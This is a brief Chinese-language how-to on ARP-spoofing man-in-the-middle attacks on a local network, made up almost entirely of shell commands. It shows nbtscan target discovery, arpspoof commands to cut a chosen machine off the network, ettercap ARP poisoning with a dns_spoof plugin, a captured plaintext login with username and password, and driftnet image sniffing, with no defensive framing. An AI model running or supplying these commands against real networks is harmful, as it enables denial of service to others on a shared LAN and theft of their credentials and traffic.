# 中间人攻击之ARP欺骗

### 让局域网同网段下的其它机器断网

```shell
sudo apt-get install dsniff

# 找到目标靶机
sudo nbtscan -r 172.16.20.17/24

# 让它断网（目标机器开启防火墙的情况下也可以操作）
# arpspoof 工具将向网络中发送伪造的 ARP 回复，将目标IP 地址的 MAC 地址更改为虚假的 MAC 地址，从而使流量被导向攻击者控制的设备。
# arpspoof -i 网卡 -t 目标IP 网关
sudo arpspoof -i eth0 -t 172.16.20.40 172.16.20.254

# 开启ip转发（1:正常上网 0:断网）
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 流量嗅探 -- 监控网络

```shell
sudo apt-get install driftnet

# -T：仅使用文本GUI
# -q：不显示详细数据内容，只显示用户名密码等
# -i：指定网卡
ettercap -Tq -i eth0
# 指定攻击人  -M arp:remote -P dns_spoof /被攻击者ip// /被攻击者网关//
ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /172.16.20.40// /172.16.20.254//
# HTTP : 19.88.55.158:80 -> USER: admin  PASS: 123456test  INFO: http://www.zhengqingya.com/login CONTENT: username=admin&pwd=123456test

# 图片嗅探 -- 监听目标机器访问http协议的图片
# 将嗅探到的图片保存到`/tmp/test`目录下
# tips： 个人测试后无效...
driftnet -i eth0 -a -d /tmp/test
```